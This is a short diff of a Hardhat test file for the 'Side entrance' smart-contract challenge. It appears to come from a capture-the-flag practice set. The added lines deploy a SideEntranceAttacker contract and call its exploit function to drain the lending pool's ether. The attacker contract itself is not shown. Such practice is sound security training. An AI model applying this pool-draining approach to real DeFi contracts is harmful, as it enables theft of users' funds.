@@ -2,7 +2,7 @@ const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');
 
-describe('[Challenge] Side entrance', function () {
+describe.only('[Challenge] Side entrance', function () {
     let deployer, player;
     let pool;
 
@@ -26,6 +26,9 @@ describe('[Challenge] Side entrance', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const attacker = await (await ethers.getContractFactory('SideEntranceAttacker')).connect(player).deploy(pool.address);
+
+        await attacker.connect(player).exploit(ETHER_IN_POOL);
     });
 
     after(async function () {
